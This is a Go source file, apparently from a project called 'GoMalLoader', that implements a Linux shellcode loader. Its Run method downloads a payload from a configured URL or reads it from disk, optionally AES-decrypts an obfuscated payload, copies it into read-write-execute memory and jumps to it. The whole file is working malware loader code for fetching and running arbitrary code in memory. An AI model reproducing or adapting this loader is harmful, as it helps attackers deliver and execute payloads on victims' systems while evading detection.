//go:build linux

package loader

import (
	"io"
	"net/http"
	"os"
	"unsafe"

	"GoMalLoader/utils"
)

type LinuxShellcodeLoader struct{}

func NewShellcodeLoader() ShellcodeLoader {
	return &LinuxShellcodeLoader{}
}

func (l *LinuxShellcodeLoader) Run(cfg LoaderConfig) error {
	var payload []byte
	var err error

	if cfg.Source == "url" {
		resp, err := http.Get(cfg.URL)
		if err != nil {
			return err
		}
		defer resp.Body.Close()
		payload, err = io.ReadAll(resp.Body)
	} else {
		payload, err = os.ReadFile(cfg.Path)
	}

	if err != nil {
		return err
	}

	if cfg.Obfuscated {
		payload, err = utils.AESDecrypt(payload, []byte(cfg.AESKey))
		if err != nil {
			return err
		}
	}

	mem := utils.NewMemoryOps()
	addr := mem.AllocRWX(len(payload))
	for i, b := range payload {
		ptr := unsafe.Pointer(addr + uintptr(i))
		*(*byte)(ptr) = b
	}

	type shellcodeFunc func()
	sc := *(*shellcodeFunc)(unsafe.Pointer(&addr))
	sc()
	return nil
}
